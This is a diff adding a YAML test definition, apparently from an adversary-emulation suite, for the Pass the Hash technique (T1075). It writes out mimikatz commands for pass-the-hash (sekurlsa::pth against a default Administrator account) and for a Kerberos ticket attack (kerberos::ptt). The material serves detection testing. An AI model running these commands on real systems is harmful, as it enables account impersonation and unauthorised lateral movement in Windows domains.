@@ -1,0 +1,43 @@
+---
+attack_technique: T1075
+display_name: Pass the Hash
+
+atomic_tests:
+- name: Mimikatz Pass the Hash
+  description: |
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    user:
+      description: username
+      type: string
+      default: Administrator
+    domain:
+      description: domain
+      type: string
+      default: atomic.local
+    ntlm:
+      description: ntlm hash
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+
+  executor:
+    name: command_prompt
+    command: |
+      mimikatz # sekurlsa::pth /user:${user} /domain:${domain} /ntlm:${ntlm}
+
+- name: Mimikatz Kerberos Ticket Attack
+  description: |
+    Similar to PTH, but attacking Kerberos
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      mimikatz # kerberos::ptt ${username}@${Domain}
